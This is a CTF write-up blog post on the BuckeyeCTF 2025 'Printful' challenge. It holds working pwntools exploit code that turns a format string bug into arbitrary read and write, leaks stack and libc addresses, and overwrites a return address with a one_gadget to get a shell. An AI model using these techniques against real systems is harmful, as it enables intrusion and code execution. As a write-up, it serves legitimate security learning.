+++
author = "vmpr0be"
title = "BuckeyeCTF 2025 - Printful"
date = "2025-11-09"
categories = ["ctf"]
+++

### Overview

![Printful banner](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/images/buckeye_printful.png?raw=true)

This challenge is essentially a black-box: the remote application's **source code and binary are not provided**, so I must discover its behavior and find the vulnerability by interacting with it remotely. All we’re given is the IP address and port.

### Exploring

#### Discovering the vulnerability

My methodology for black-box challenges is to gather as much information about the application as possible. The challenge name is called **"printful"**, which made me think of the C library function `printf`, which made me suspect a [format string vulnerability](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/).

I connected to the remote server using the provided command: `ncat --ssl printful.challs.pwnoh.io 1337` and received the following terminal output:

```bash
Welcome to printful! Enter 'q' to quit
> 
```

I then sent a formatted string which will reveal whether the application was is vulnerability the the format string vulnerability:

```bash
Welcome to printful! Enter 'q' to quit
> %p  
0x55af2154c00b
>
```

As I can see from the address (`0x55af2154c00b`) returned, **the application is indeed vulnerable to a format string vulnerability**. If it were not, the `%p` itself would have been printed back.

This effectively gives an **arbitrary read/write primitive**. The read primitive can be used to dump memory and gather information about the application's environment (for example, stack, libc base and version), I’ll come back to that later.

P.S. I also tested for a buffer overflow (BOF) by sending long input to crash the application, but it didn't work.

#### Dumping the stack

We’ll start by writing a python script to connect to the remote service and use the arbitrary read primitive.

```python
# Quick helper function to convert 8 bytes into a 64 bit integer
def unpack_ptr(bytes):
    return u64(bytes.ljust(8, b"\0")[:8])

# The format string buffer is usually located at the 6th positional argument.
# This uses the format string vulnerability to read stack.
# The read can be done by using the %p format specifier.
# I can select which 8 byte element I want to read from the stack
# The offset is the distance from the internal printf arguments to the address to be read.
# The offset here must be 8 bytes aligned 
def arb_stack_read_ptr(offset):
    index = 6 + offset // 8
    r.sendlineafter(b"> ", f"%{index}$p".encode())
    return int(r.recvline(drop=True), 16)

# This is a wrapper that will read 'size' bytes from the specified offset.
def arb_stack_read(offset, size):
    if size <= 0:
        return b""

    start_block = offset // 8
    end_block = (offset + size - 1) // 8
    
    blocks = []
    for block in range(start_block, end_block + 1):
        val = arb_stack_read_ptr(block * 8)
        blocks.append(p64(val))
    
    combined = b"".join(blocks)
    start_pos = offset - (start_block * 8)
    return combined[start_pos:start_pos + size]
```
 
Now let’s dump the stack with following function:

```python
for offset in range(0, 0x200, 8):
    value = arb_stack_read_ptr(offset)
    print(f"{hex(offset)}: {hex(value)}")
```

But before analyzing the results, you must know that the displayed addresses will be generally different due to ASLR; but most of the time, the layout and the first 3 digits remain constant.

```bash
+----------+--------------------+--------------+
| Offset    | Value              | Comment      |
+----------+--------------------+--------------+
| 0x108    | 0x75c539f17be0a900 | STACK CANARY |
| 0x110    | 0x7ffe83e28c10      | SAVED RBP    |
| 0x118    | 0x559e8572d2de     | RETURN ADDR  |
+----------+--------------------+--------------+
```

In reality, it's a bit more chaotic, but here I've simplified it and will go over the essentials:
- The stack canary can be identified by looking for a relatively large 64 bit inteteger with the **two first digits zeroed**.
- Finding the stack canary essentially lets us determine where the return address for the current frame is, since return addresses are always located after the stack canary (that's how stack canaries work).
- The main function of most applications is called via LIBC, that's due to the program's actual entry point invoking `__libc_start_main`, so somewhere on the stack there will be **a return address that belongs to LIBC**; in this case, it was just a few bytes after the first stack frame (probably due to the simplicity of the application's code).

```bash
+----------+----------------+-----------------------+
| Offset    | Value          | Comment               |
+----------+----------------+-----------------------+
| 0x120    | 0x0            |                       |
| 0x128    | 0x7f2f4e463083 |  LIBC return address  |
| 0x130    | 0x200000001    |                       |
| 0x138    | 0x7ffe83e28d08  |                       |
| 0x140    | 0x14e6277a0    |                       |
| 0x148    | 0x559e8572d283 | main function address |
+----------+----------------+-----------------------+
```

Let's summarize what I just did:
- I used the format string vulnerability to construct an arbitrary stack read primitive.
- I used that primitive to **dump stack memory and leak values**.
- I identified the offsets and leaked the values/addresses of the stack canary, LIBC, stack, and the executable.

#### Going deeper

Great, even though I have all these leaks, I can't really do much with them yet because I don't know which LIBC version the application is using, so I can't know where gadgets are located.

But, using the format string vulnerability, I can also achieve an arbitrary read primitive:

```python
# This function will use the format string vulnerability to achieve an arbitrary read primitive.
# This is done by using the %s format specifier to read a string from an address.
# I can tell printf that the address of that string is located on the 7th positional argument, aka the 8–16 bytes of our format string.
def arb_read(address, size):
    data = b""

    # Keeps reading until I read 'size' bytes
    while len(data) < size:
        current_address = address + len(data)

        # The address is located at buffer+8, meaning it's at the 7th position
        # "----" act as padding for an 8 byte alignement and delimiters
        payload = b"%7$s----" + p64(current_address)
        r.sendlineafter(b"> ", payload)

        # Example: b"\x??\x??\x??\x??...\x??----"
        # Need to get everything before the delimiter
        data += r.recvuntil(b"----", drop=True)

        # Since the printing will only stop at a null character, so I need compensate for it
        data += p8(0)

    # Return only what was requested
    return data[:size]

# Simple wrapper around 'arb_read' to read 64 bit pointers
def arb_read_ptr(address):
    return unpack_ptr(arb_read(address, 8))
```

Initially I planned to take the return address, align it to a 0x1000 boundary, and then keep decrementing it by 0x1000 while reading the first two bytes until hitting the ELF header signature. For simplicity, I used a simpler method.

First, I dumped the instructions preceding the LIBC return address by substracting an offset from the original return address, these instructions usually belong to `__libc_start_main`.

```python
# The 0x20 is how many bytes backward
backward_addr = libc_ret - 0x20

# The 'call reg' instruction is 2 bytes, this helps with finding the good offset.
raw_data = arb_read(backward_addr, 0x20 + 2)
disassembled = disasm(raw_data , vma=backward_addr)
print(disassembled.rstrip())
```

Because **x86 uses isn't self synchronizing**, the disassembly may not be aligned which results in bad instructions, you might need to try multiple offsets until the last call instruction is printed. After a few attempts, this is what I ended up with:

```bash
[*] saved_rbp: 0x7fff85c63660
[*] libc_ret: 0x7f3d00cf9083

...
7f3d00cf9069: mov  rax, QWORD PTR [rip+0x1c7e40] # 0x7f3d00ec0eb0 (__environ)
7f3d00cf9070: mov  rsi, QWORD PTR [rsp+0x8]      # argv
7f3d00cf9075: mov  edi, DWORD PTR [rsp+0x14]     # argc
7f3d00cf9079: mov  rdx, QWORD PTR [rax]          # envp
7f3d00cf907c: mov  rax, QWORD PTR [rsp+0x18]     # gets the main function address
7f3d00cf9081: call rax                           # calls main function
7f3d00cf9083: mov  edi, eax                      # LIBC return address (libc_ret)
```

As mentioned previously, the first 3 digits of every address are always constant (since ASLR randomization happens on a page level). this is the main reason why [libc database search tools](https://libc.blukat.me/) exist, they work by looking up symbols offsets that have the sames 3 first digits.

On most recent LIBC versions, there's a global variable called `__environ` which is accessed when calling the main function (that's where the `envp` comes from), meaning that now I have the address of `__environ` global variable (`0x7fca4599eeb0`), I can also dump further instructions and target more symbols to narrow down the results.

Without going in further details on fully identifying the LIBC version, it ended up being [libc6_2.31-0ubuntu9.9_amd64](https://libc.blukat.me/d/libc6_2.31-0ubuntu9.9_amd64.so).

To sumarize:
- I created an arbitrary read primitive using the format string vulnerabiltiy
- I used the previously leaked LIBC return address to dump instructions from the `__libc_start_main` function. 
- I extracted the `__environ` global variable address from the instruction dump.
- I identified the LIBC version using the last 3 constant digits of the `__environ` address with the help of [blukat](https://libc.blukat.me/).

### Exploitation

Using the format string vulnerability, I was able to achieve an arbitrary write primitive. This is done by using the `%n` format specifier, which acts the same as the previous `%s` specifier, but instead of reading, it will write the current number of printed bytes to that address. To avoid manually crafting a payload, I used the pwntools function called [fmtstr_payload](https://docs.pwntools.com/en/dev/fmtstr.html).

With this arbitrary write primitive, I was able to **overwrite the LIBC return address with any address**, which in return will be called once the program exits. Luckily, there's a command `"q"` (alias for quit, I guess?) which exits this program. Usually exiting is done gracefully, meaning **it will return from the main function** into the LIBC code by reading the return address from the stack, but since **we've ovewritten the return address** it will cause our address to be executed instead and thus **achieving arbitrary code execution**.

```python
# This uses the "fmtstr_payload" from pwntools to craft a payload that will achieve an arbitrary write
def arb_write_ptr(address, value):
    payload = fmtstr_payload(6, {
        address: value
    })
    r.sendlineafter(b"> ", payload)
```

Initially I was going to use multiple stack writes to construct a [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) chain in order to spawn a shell, but I decided to try my luck with a one gadget.

To display the one gadgets and their constraints i used the [one_gadget](https://github.com/david942j/one_gadget) tool.

```bash
one_gadget libc6_2.31-0ubuntu9.9_amd64.so

0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

Unfortunately, **we don't know the CPU state when the arbitrary address is executed**. Thus, we can't know if one gadget meets the constraints, but luckily, after a few attempts, the gadget at `libc_base + 0xe3b01` seemed to work, thus resulting in a shell being spawned.

```bash
./solve.py
[+] Opening connection to printful.challs.pwnoh.io on port 1337: Done
[*] saved_rbp: 0x7fff90c23c70
[*] libc_ret: 0x7fb27e185083
[*] __environ: 0x7fb27e350600
[*] libc_base: 0x7fb27e161000
[*] one_gadget: 0x7fb27e244b01
[*] Switching to interactive mode
Goodbye!
$ cat flag.txt
bctf{t15_a_g1ft_t0_b3_pr1n7ful_731066c9c5cc}
```

The full code can be found [here](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/solutions/buckeye_printful.py).

### Conclusion

Overall, the challenge was pretty fun. It took me around an hour to complete it, which isn't so bad.
